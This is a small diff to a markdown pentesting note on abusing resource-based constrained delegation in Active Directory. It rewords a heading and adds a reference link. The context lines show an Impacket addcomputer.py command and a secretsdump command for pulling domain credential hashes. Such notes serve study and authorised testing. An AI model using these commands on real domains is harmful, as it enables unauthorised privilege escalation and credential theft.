@@ -23,7 +23,7 @@ This attribute specifies which service accounts or systems are permitted to act 
 ![image](https://github.com/user-attachments/assets/4b44f38a-49c4-45fb-b68f-ddf8a3f1442b)
 
 - Exploiting with rbcd tool
-- Impacket tool `[AddCOmputer]`Syntax-:
+- Impacket tool `[AddCOmputer]`Syntax to add a computer-:
 
 ```bash
 addcomputer.py -computer-name 'password' -computer-pass 'password' -dc-ip [ip] '[domain]/[username]:[password]'
@@ -80,6 +80,12 @@ impacket-secretsdump -k -target-ip [ip] [domain name]
 ![image](https://github.com/user-attachments/assets/0f8af80b-c32a-4782-a63d-0f76e1e93cf7)
 
 ------------------------
+
+### Reference
+
+-----------------------
+
+- [Unconstrained Resource Delegation](https://medium.com/r3d-buck3t/how-to-abuse-resource-based-constrained-delegation-to-gain-unauthorized-access-36ac8337dd5a)
 
 
 
